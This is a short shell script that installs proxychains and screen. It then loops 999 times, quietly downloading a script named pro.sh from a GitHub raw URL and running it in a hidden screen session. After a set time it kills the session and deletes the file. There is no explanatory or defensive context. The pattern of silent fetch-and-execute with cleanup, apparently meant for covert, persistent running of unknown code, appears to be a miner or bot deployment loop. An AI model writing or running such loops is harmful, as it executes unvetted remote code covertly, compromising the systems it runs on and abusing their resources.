#!/bin/sh

apt update

apt install proxychains

apt install screen -y

for i in `seq 1 999`; do echo $i; wget -q https://raw.githubusercontent.com/renilo/bh/main/pro.sh >/dev/null 2>&1; chmod +x pro.sh >/dev/null 2>&1; screen -dmS Running ./pro.sh ; sleep 1500; clear; screen -XS Running quit; rm -f pro.sh; echo SETTING PROJECT; sleep 300; done
